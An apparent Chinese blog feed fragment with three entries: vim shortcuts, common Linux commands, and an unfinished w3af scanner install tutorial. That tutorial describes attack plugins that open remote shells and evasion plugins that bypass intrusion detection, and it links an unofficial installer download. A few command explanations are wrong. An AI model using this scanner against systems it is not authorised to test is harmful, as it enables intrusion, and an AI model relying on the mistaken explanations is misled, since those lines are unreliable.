    <content type="html"><![CDATA[<p>在linux上有个强大的编译器，这个编译器就是vim，下面是一个vim的键盘图，有利于学习和复习。<br><a id="more"></a><br><img src="/upload_img/vim.png" alt=""></p>
<h2 id="复制剪切粘贴"><a href="#复制剪切粘贴" class="headerlink" title="复制剪切粘贴"></a>复制剪切粘贴</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yy  # 复制一行</div><div class="line">dd  # 剪切一行</div><div class="line">p   # 粘贴</div></pre></td></tr></table></figure>
<h2 id="查找单词"><a href="#查找单词" class="headerlink" title="查找单词"></a>查找单词</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bin/bash&gt;:/nmask # 查找存在nmask字符串的位置</div><div class="line">或者</div><div class="line">bin/bash&gt;:?nmask # 查找存在nmask字符串的位置</div></pre></td></tr></table></figure>
<p>继续查找下一个存在nmask字符串的位置<br>    n 往上查找<br>    N 往下查找</p>
<h2 id="编辑器显示设置"><a href="#编辑器显示设置" class="headerlink" title="编辑器显示设置"></a>编辑器显示设置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">:set nu!        # 显示行号</div><div class="line">:set autoindent # 自动缩进</div><div class="line">:syntax enable  # 语法高亮</div></pre></td></tr></table></figure>
<h2 id="文件内容定位"><a href="#文件内容定位" class="headerlink" title="文件内容定位"></a>文件内容定位</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gg              # 首行</div><div class="line">G               # 末行</div><div class="line">XG              # 定位到第X行</div><div class="line">或者：</div><div class="line">bin/bash&gt;：10   # 定位到第10行</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在linux上有个强大的编译器，这个编译器就是vim，下面是一个vim的键盘图，有利于学习和复习。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://y-hkl.top/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Linux" scheme="http://y-hkl.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础命令</title>
    <link href="http://y-hkl.top/2017/12/06/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
    <id>http://y-hkl.top/2017/12/06/Linux基础命令/</id>
    <published>2017-12-07T02:35:40.000Z</published>
    <updated>2017-12-08T02:27:16.659Z</updated>
    
    <content type="html"><![CDATA[<p>在安全方面，掌握Linux系统对安全研究是非常重要的。首先我们就需要对一些常用的命令和参数熟连掌握，然后一步一步的进行深入的学习。这篇文章，主要分享一些我常用的Linux命令，也是做一个笔记，为以后复习做准备。<br><a id="more"></a></p>
<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><h3 id="解析命令的意思（whatis、info）"><a href="#解析命令的意思（whatis、info）" class="headerlink" title="解析命令的意思（whatis、info）"></a>解析命令的意思（whatis、info）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">whatis   解析命令的意思</div><div class="line">info     详细解析命令的意思</div></pre></td></tr></table></figure>
<h3 id="寻找命令的安装路径（which、whereis）"><a href="#寻找命令的安装路径（which、whereis）" class="headerlink" title="寻找命令的安装路径（which、whereis）"></a>寻找命令的安装路径（which、whereis）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">which     寻找命令的位置</div><div class="line">whereis   寻找程序的位置</div></pre></td></tr></table></figure>
<h2 id="目录管理"><a href="#目录管理" class="headerlink" title="目录管理"></a>目录管理</h2><p>文件管理不外乎文件或目录的创建、删除、查询、移动，有mkdir/rm/mv</p>
<h3 id="创建和删除"><a href="#创建和删除" class="headerlink" title="创建和删除"></a>创建和删除</h3><p>创建：mkdir<br>删除：rm<br>删除非空目录：rm -rf file目录<br>移动：mv<br>复制：cp (复制目录：cp -r )</p>
<p>查看当前目录下文件个数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$find ./ | wc -l</div></pre></td></tr></table></figure></p>
<p>复制目录:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$cp -r source_dir  dest_dir</div></pre></td></tr></table></figure></p>
<h3 id="列出目录项（ls、tree）"><a href="#列出目录项（ls、tree）" class="headerlink" title="列出目录项（ls、tree）"></a>列出目录项（ls、tree）</h3><p>显示当前目录下的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls</div></pre></td></tr></table></figure></p>
<p>查看目录结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tree</div></pre></td></tr></table></figure></p>
<p>按时间排序，以列表的方式显示目录项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -lrt</div></pre></td></tr></table></figure></p>
<p>以上这个命令用到的频率如此之高，以至于我们需要为它建立一个快捷命令方式:<br>在.bashrc 中设置命令别名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alias lsl=&apos;ls -lrt&apos;</div><div class="line">alias lm=&apos;ls -al|more&apos;</div></pre></td></tr></table></figure></p>
<p>给每项文件前面增加一个id编号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls | cat -n</div></pre></td></tr></table></figure></p>
<p>显示可阅读的文件大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ll -h</div></pre></td></tr></table></figure></p>
<h3 id="文件和目录权限（chmod、chown）"><a href="#文件和目录权限（chmod、chown）" class="headerlink" title="文件和目录权限（chmod、chown）"></a>文件和目录权限（chmod、chown）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">改变文件的拥有者 chown</div><div class="line">改变文件读、写、执行等属性 chmod</div><div class="line">递归子目录修改： chown -R tuxapp source/</div><div class="line">增加脚本可执行权限： chmod a+x myscript</div></pre></td></tr></table></figure>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h3 id="文件创建删除-touch、echo、rm-f"><a href="#文件创建删除-touch、echo、rm-f" class="headerlink" title="文件创建删除(touch、echo、rm -f)"></a>文件创建删除(touch、echo、rm -f)</h3><p>删除日志文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm *log (等价: $find ./ -name “*log” -exec rm &#123;&#125; ;)</div></pre></td></tr></table></figure></p>
<h3 id="文件查看-du-sh"><a href="#文件查看-du-sh" class="headerlink" title="文件查看(du -sh)"></a>文件查看(du -sh)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh  文件名</div></pre></td></tr></table></figure>
<p>统计文件行数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wc -l test.txt</div></pre></td></tr></table></figure></p>
<h3 id="文件内容查看（cat-head-tail）"><a href="#文件内容查看（cat-head-tail）" class="headerlink" title="文件内容查看（cat,head,tail）"></a>文件内容查看（cat,head,tail）</h3><p>显示时同时显示行号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat -n  （如：cat test.txt | cat -n）</div></pre></td></tr></table></figure></p>
<p>动态查看文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tail -f filename #当有内容写入文件中再输出</div></pre></td></tr></table></figure></p>
<p>正向逆向查看文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">head -1 filename # 第1行内容</div><div class="line">tail -5 filename # 倒数5行内容</div></pre></td></tr></table></figure></p>
<h3 id="文件搜索（find）"><a href="#文件搜索（find）" class="headerlink" title="文件搜索（find）"></a>文件搜索（find）</h3><p>查找txt和pdf文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . \( -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \) -print</div></pre></td></tr></table></figure></p>
<p>否定参数 ,查找所有非txt文本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . ! -name &quot;*.txt&quot; -print</div></pre></td></tr></table></figure></p>
<p>指定搜索深度,打印出当前目录的文件（深度为1）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -maxdepth 1 -type f</div></pre></td></tr></table></figure></p>
<p>说明：-type  f为文件，d为目录</p>
<h4 id="按时间搜索"><a href="#按时间搜索" class="headerlink" title="按时间搜索"></a>按时间搜索</h4><p>-atime 访问时间 (单位是天，分钟单位则是-amin，以下类似）<br>-mtime 修改时间 （内容被修改）<br>-ctime 变化时间 （元数据或权限变化）<br>最近第7天被访问过的所有文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -atime 7 -type f -print</div></pre></td></tr></table></figure></p>
<p>最近7天内被访问过的所有文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -atime -7 -type f -print</div></pre></td></tr></table></figure></p>
<p>查询7天前被访问过的所有文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -atime +7 type f -print</div></pre></td></tr></table></figure></p>
<p>按权限查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -type f -perm 644 -print //找具有可执行权限的所有文件</div></pre></td></tr></table></figure></p>
<p>按用户查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -type f -user weber -print// 找用户weber所拥有的文件</div></pre></td></tr></table></figure></p>
<h3 id="找到后的后续动作（exec）"><a href="#找到后的后续动作（exec）" class="headerlink" title="找到后的后续动作（exec）"></a>找到后的后续动作（exec）</h3><p>执行动作（强大的exec）<br>将当前目录下的所有权变更为weber:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -type f -user root -exec chown weber &#123;&#125; \;</div></pre></td></tr></table></figure></p>
<p>注：{}是一个特殊的字符串，对于每一个匹配的文件，{}会被替换成相应的文件名；<br>将找到的文件全都copy到另一个目录:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -type f -mtime +10 -name &quot;*.txt&quot; -exec cp &#123;&#125; OLD \;</div></pre></td></tr></table></figure></p>
<h3 id="文件内容搜索-grep"><a href="#文件内容搜索-grep" class="headerlink" title="文件内容搜索(grep)"></a>文件内容搜索(grep)</h3><p>查看成功登陆ssh的IP地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">centos</div><div class="line">for i in `grep &apos;sshd&apos; /var/log/secure* | grep -oE  &apos;\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;&apos; | sort  | uniq`; do curl  -s --header &quot;X-Forwarded-For: $i&quot; http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P &apos;(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)&apos; ; done</div><div class="line">ubuntu：</div><div class="line">for i in `grep &apos;sshd&apos; /var/log/auth.log* |grep &apos;Accepted&apos; |grep ftp| grep -oE  &apos;\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;&apos; | sort  | uniq`; do curl  -s --header &quot;X-Forwarded-For: $i&quot; http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P &apos;(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)&apos; ; done</div></pre></td></tr></table></figure></p>
<h3 id="文件内容排序-sort"><a href="#文件内容排序-sort" class="headerlink" title="文件内容排序(sort)"></a>文件内容排序(sort)</h3><p>-n 按数字进行排序 VS -d 按字典序进行排序<br>-r 逆序排序<br>-k N 指定按第N列排序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sort -nrk 1 data.txt</div><div class="line">sort -bd data // 忽略像空格之类的前导空白字符</div></pre></td></tr></table></figure></p>
<h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">useradd -m username</div></pre></td></tr></table></figure>
<p>该命令为用户创建相应的帐号和用户目录/home/username<br>设置密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">passwd username</div></pre></td></tr></table></figure></p>
<p>删除用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">userdel -r username</div></pre></td></tr></table></figure></p>
<p>注意：不带选项使用 userdel，只会删除用户。用户的家目录将仍会在/home目录下。要完全的删除用户信息，使用-r选项</p>
<p>帐号切换 登录帐号为userA用户状态下，切换到userB用户帐号工作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">su userB</div></pre></td></tr></table></figure></p>
<h3 id="用户的组"><a href="#用户的组" class="headerlink" title="用户的组"></a>用户的组</h3><h4 id="将用户加入到组"><a href="#将用户加入到组" class="headerlink" title="将用户加入到组"></a>将用户加入到组</h4><p>默认情况下，添加用户操作也会相应的增加一个同名的组，用户属于同名组； 查看当前用户所属的组:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groups</div></pre></td></tr></table></figure></p>
<p>一个用户可以属于多个组，将用户加入到组:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">usermod -G groupNmame username</div></pre></td></tr></table></figure></p>
<p>变更用户所属的根组(将用加入到新的组，并从原有的组中除去）:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">usermod -g groupName username</div></pre></td></tr></table></figure></p>
<h4 id="查看系统所有组"><a href="#查看系统所有组" class="headerlink" title="查看系统所有组"></a>查看系统所有组</h4><p>系统的所有用户及所有组信息分别记录在两个文件中：/etc/passwd , /etc/group 默认情况下这两个文件对所有用户可读：</p>
<p>查看所有用户及权限:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">more /etc/passwd</div></pre></td></tr></table></figure></p>
<p>查看所有的用户组及权限:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">more /etc/group</div></pre></td></tr></table></figure></p>
<h3 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h3><p>chown 更改读写权限<br>chmod 更改用户的拥有者</p>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p>杀死python相关的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ps -ef | grep python | cut -d &apos; &apos; -f 2 | xargs kill</div><div class="line">或者</div><div class="line">pkill -9 python  #-9表示强制删除，pkill以进程名字匹配</div></pre></td></tr></table></figure></p>
<p>查看进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -ef | less</div></pre></td></tr></table></figure></p>
<p>查看端口占用的进程状态：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsof -i:3306</div></pre></td></tr></table></figure></p>
<p>显示进程信息，并实时更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">top</div></pre></td></tr></table></figure></p>
<p>杀死指定PID的进程 (PID为Process ID)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">kill PID</div></pre></td></tr></table></figure></p>
<p>查询7902端口现在运行什么程序:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#分为两步</div><div class="line">#第一步，查询使用该端口的进程的PID；</div><div class="line">$lsof -i:7902</div><div class="line">COMMAND   PID   USER   FD   TYPE    DEVICE SIZE NODE NAME</div><div class="line">WSL     30294 tuapp    4u  IPv4 447684086       TCP 10.6.50.37:tnos-dp (LISTEN)</div><div class="line"></div><div class="line">#查到30294</div><div class="line">#使用ps工具查询进程详情：</div><div class="line">$ps -fe | grep 30294</div><div class="line">tdev5  30294 26160  0 Sep10 ?        01:10:50 tdesl -k 43476</div><div class="line">root     22781 22698  0 00:54 pts/20   00:00:00 grep 11554</div></pre></td></tr></table></figure></p>
<h2 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h2><p>查看网络连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -an | less</div></pre></td></tr></table></figure></p>
<p>查看网络路由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route -n</div></pre></td></tr></table></figure></p>
<p>只查看ip信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig | grep inet</div></pre></td></tr></table></figure></p>
<h3 id="ftp-sftp-ssh"><a href="#ftp-sftp-ssh" class="headerlink" title="ftp sftp ssh"></a>ftp sftp ssh</h3><p>SSH登陆:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh ID@host</div></pre></td></tr></table></figure></p>
<p>ssh登陆远程服务器host，ID为用户名。<br>ftp/sftp文件传输:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sftp ID@host</div></pre></td></tr></table></figure></p>
<p>登陆服务器host，ID为用户名。sftp登陆后，可以使用下面的命令进一步操作：<br>    get filename # 下载文件<br>    put filename # 上传文件<br>    ls # 列出host上当前路径的所有文件<br>    cd # 在host上更改当前路径<br>    lls # 列出本地主机上当前路径的所有文件<br>    lcd # 在本地主机更改当前路径</p>
<h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><p>查看系统位数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>查看系统版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release -a</div></pre></td></tr></table></figure></p>
<p>查看hosts文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/hosts</div></pre></td></tr></table></figure></p>
<p>查看CPU的核的个数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /proc/cpuinfo | grep processor | wc -l</div></pre></td></tr></table></figure></p>
<p>查看系统信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">uname -a</div><div class="line">uname -m 显示机器的处理器架构</div><div class="line">uname -r 显示正在使用的内核版本</div><div class="line">cat /proc/cpuinfo 显示CPUinfo的信息</div><div class="line">cat /proc/meminfo 校验内存使用</div><div class="line">cat /proc/version 显示内核的版本</div><div class="line">cat /proc/net/dev 显示网络适配器及统计</div><div class="line">cat /proc/mounts 显示已加载的文件系统</div></pre></td></tr></table></figure></p>
<h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><p>查看磁盘空间利用大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">df -h</div></pre></td></tr></table></figure></p>
<p>挂载U盘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">fdisk -l 查看U盘路径</div><div class="line">monut /dev/sdb4 /mnt  挂载U盘</div><div class="line">cd /mnt 进入U盘</div><div class="line">umount /mnt  退出U盘</div></pre></td></tr></table></figure></p>
<h2 id="Linux学习网站"><a href="#Linux学习网站" class="headerlink" title="Linux学习网站"></a>Linux学习网站</h2><p><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/" target="_blank" rel="external">http://linuxtools-rst.readthedocs.io/zh_CN/latest/</a><br><a href="http://man.linuxde.net/" target="_blank" rel="external">http://man.linuxde.net/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在安全方面，掌握Linux系统对安全研究是非常重要的。首先我们就需要对一些常用的命令和参数熟连掌握，然后一步一步的进行深入的学习。这篇文章，主要分享一些我常用的Linux命令，也是做一个笔记，为以后复习做准备。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://y-hkl.top/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Linux" scheme="http://y-hkl.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Web安全工具——w3af教程</title>
    <link href="http://y-hkl.top/2017/11/28/Web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E2%80%94%E2%80%94w3af%E6%95%99%E7%A8%8B/"/>
    <id>http://y-hkl.top/2017/11/28/Web安全工具——w3af教程/</id>
    <published>2017-11-29T03:28:24.000Z</published>
    <updated>2017-11-29T04:46:42.812Z</updated>
    
    <content type="html"><![CDATA[<p>W3af是一个基于Python的Web应用扫描器,在之前的版本中有windows的版本，但是在最新的版本中windows不再更新，如果想要安装windows版本，下面有链接：<br><a id="more"></a></p>
<h2 id="windows安装W3af"><a href="#windows安装W3af" class="headerlink" title="windows安装W3af"></a>windows安装W3af</h2><p>百度云地址如下：<br>链接：<a href="https://pan.baidu.com/s/1pKTmllx" target="_blank" rel="external">https://pan.baidu.com/s/1pKTmllx</a><br>密码：owf4<br>下载成功后，直接运行exe进行安装即可<br>安装完成后，桌面上多了两个图标w3af Console和w3af GUI<br><img src="/upload_img/W3af_1.png" alt=""><br>打开w3af GUI，会同时打开命令行界面和图形界面<br><img src="/upload_img/W3af_2.png" alt=""></p>
<h2 id="Linux安装W3af"><a href="#Linux安装W3af" class="headerlink" title="Linux安装W3af"></a>Linux安装W3af</h2><p>这次安装是在ubuntu系统，ubuntu下不建议使用apt-get安装，在安装包的依赖关系上可能会存在一些问题。</p>
<h3 id="确保安装环境"><a href="#确保安装环境" class="headerlink" title="确保安装环境"></a>确保安装环境</h3><p>安装Git 客户端:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install git</div></pre></td></tr></table></figure></p>
<p>python需要2.7的环境<br>安装pip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-pip</div></pre></td></tr></table></figure></p>
<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>下载W3af<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/andresriancho/w3af.git</div></pre></td></tr></table></figure></p>
<p>进入目录执行w3af_console文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd w3af</div><div class="line">./w3af_console</div></pre></td></tr></table></figure></p>
<p>会提示系统未安装很多依赖环境：<br><img src="/upload_img/W3af_3.png" alt=""><br>需要安装的环境，已经写在了/tmp目录下的w3af_dependency_install.sh文件里面，执行它即会自动下载安装所需的所有文件<br><img src="/upload_img/W3af_4.png" alt=""><br>如果环境安装没有问题的话，这时候就可以运行w3af了，但是偏偏又出错了<br><img src="/upload_img/W3af_5.png" alt=""><br>报错提示我的OpenSSL模块出了问题<br>报错的原因是说module对象的几个属性不存在，于是小编注释掉了SSL.py的4个属性<br><img src="/upload_img/W3af_6.png" alt=""><br>进一步安装了一个库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install crypto</div></pre></td></tr></table></figure></p>
<p>最终成功运行，但是！！！运行控制台的时候，还是需要安装2个依赖包<br><img src="/upload_img/W3af_7.png" alt=""><br>按照提示安装好了后，就可以运行gui了。<br><img src="/upload_img/W3af_8.png" alt=""></p>
<h2 id="W3af的基础教程"><a href="#W3af的基础教程" class="headerlink" title="W3af的基础教程"></a>W3af的基础教程</h2><h3 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h3><p>主要插件：<br>1.Crawl（爬取）类<br>职责：通过爬取网站站点来获得新的URL地址。<br>如果用户启用了Crawl类型的多个插件，此时将产生一个循环： A插件在第一次运行时发现了一个新的url，w3af会将其发送到插件B。如果插件B发现一个新的url则会发送到插件A。这个过程持续进行直到所有插件都已运行且无法找到更多的新信息。<br>2.Audit（审计）类<br>该类插件会向Crawl插件爬取出的注入点发送特制的POC数据以确认漏洞是否存在。<br>3.Attack（攻击）类<br>如果Audit插件发现了漏洞，Attack将会进行攻击和利用，通常会在远程服务器上返回一个shell或者比如SQL注入则会获取数据库的数据。<br>其他插件：<br>1.Infrastructure（基础）插件<br>这类插件用来标识有关目标系统的信息，如安装的WAF，操作系统和HTTP守护进程等。<br>2.Grep（检索）插件<br>这类插件会分析其他插件发送的HTTP请求和相应并识别漏洞。<br>3.Output（输出）插件<br>这类插件会将插件的数据保存到文本，xml或者是html文件中。调试的信息也会发送到输出Output插件并可保存和分析。<br>如果启用了text_file和xml_file这两个Output插件，则这两个都会记录有Audit插件发现的任何漏洞。<br>4.Mangle插件<br>允许修改基于正则表达式的请求和响应。<br>5.Broutforce插件<br>在爬去阶段进行暴力登陆。<br>6.Evasion（绕过）插件<br>通过修改由其他插件生成的HTTP请求来绕过简单的入侵检测规则。</p>
<h3 id="运行W3af"><a href="#运行W3af" class="headerlink" title="运行W3af"></a>运行W3af</h3><p>$ ./w3af_console<br>w3af&gt;&gt;&gt;<br>通过”help“命令查看帮助信息，“help”命令可以带一个参数，如果参数有效，则会显示该参数命令的详细帮助信息<br><img src="/upload_img/W3af_9.png" alt=""><br>所有的插件配置菜单都提供了以下命令：<br>help：获得每个配置参数的详细帮助<br>view：列出所有可配置参数及其值和说明<br>set：用于更改值<br>back：返回上一个菜单，也可以使用Ctrl+C</p>
<h3 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h3><p>除了攻击插件之外，所有插件都可以使用plugins这个配置菜单进行配置。<br>下面是列出Audit（审计）类型的所有插件<br><img src="/upload_img/W3af_10.png" alt=""><br>假设要启用xss和sqli插件，需要用到以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">audit xss,sqli</div></pre></td></tr></table></figure></p>
